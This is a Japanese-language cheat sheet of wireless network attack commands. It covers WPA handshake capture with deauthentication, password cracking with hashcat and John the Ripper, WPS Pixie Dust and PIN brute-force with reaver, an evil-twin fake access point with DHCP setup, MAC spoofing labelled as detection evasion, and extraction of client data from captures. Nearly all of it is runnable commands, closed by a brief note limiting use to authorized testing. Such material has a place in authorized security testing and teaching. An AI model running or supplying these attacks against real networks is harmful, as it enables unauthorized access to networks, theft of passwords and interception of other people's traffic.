# WiFi Penetration Testing Techniques

## 無線LANカードの設定

### モニターモードの有効化
```bash
# インターフェースの確認
iwconfig

# モニターモードの有効化
airmon-ng check kill
airmon-ng start wlan0

# モニターモードの確認
iwconfig wlan0mon
```

## WPA/WPA2クラック

### ネットワークスキャン
```bash
# 周辺のWiFiネットワークをスキャン
airodump-ng wlan0mon

# 特定のネットワークを監視
airodump-ng -c [チャンネル] --bssid [BSSID] -w [保存ファイル名] wlan0mon
```

### WPA ハンドシェイクの取得
```bash
# クライアントの認証を待機
airodump-ng -c [チャンネル] --bssid [BSSID] -w [保存ファイル名] wlan0mon

# Deauth攻撃でハンドシェイクを強制取得
aireplay-ng -0 1 -a [BSSID] -c [クライアントMAC] wlan0mon
```

### パスワードクラック
```bash
# Hashcatを使用したクラック
hashcat -m 22000 [キャプチャファイル].cap [辞書ファイル]

# John the Ripperを使用したクラック
john --wordlist=[辞書ファイル] [ハッシュファイル]
```

## WPS攻撃

### Pixie Dust攻撃
```bash
# WPS有効なAPの検索
wash -i wlan0mon

# Pixie Dust攻撃の実行
reaver -i wlan0mon -b [BSSID] -c [チャンネル] -K 1
```

### ブルートフォース攻撃
```bash
# WPSピンのブルートフォース
reaver -i wlan0mon -b [BSSID] -c [チャンネル] -vv
```

## Evil Twin攻撃

### 偽APの作成
```bash
# hostapd設定ファイルの作成
cat << EOF > fake-ap.conf
interface=wlan0
driver=nl80211
ssid=[ターゲットSSID]
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# 偽APの起動
hostapd fake-ap.conf
```

### DHCPサーバーの設定
```bash
# dnsmasq設定
cat << EOF > dnsmasq.conf
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# DHCPサーバー起動
dnsmasq -C dnsmasq.conf
```

## 防御検知回避

### チャンネルホッピング
```bash
# チャンネルを自動で切り替え
airodump-ng --band abg wlan0mon
```

### MACアドレスのスプーフィング
```bash
# MACアドレスの変更
macchanger -r wlan0mon

# 特定のMACアドレスに変更
macchanger -m XX:XX:XX:XX:XX:XX wlan0mon
```

## キャプチャ解析

### パケット解析
```bash
# Wiresharkでの解析
wireshark [キャプチャファイル].cap

# tsharkでの解析
tshark -r [キャプチャファイル].cap -Y "wlan.fc.type_subtype == 0x08"
```

### クライアント情報の抽出
```bash
# 接続履歴の抽出
tshark -r [キャプチャファイル].cap -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan.bssid
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- 無線LANの不正アクセスは法律違反となる可能性があります
- テスト環境以外での使用は違法となる可能性があります
- 電波法に違反する可能性のある操作が含まれています 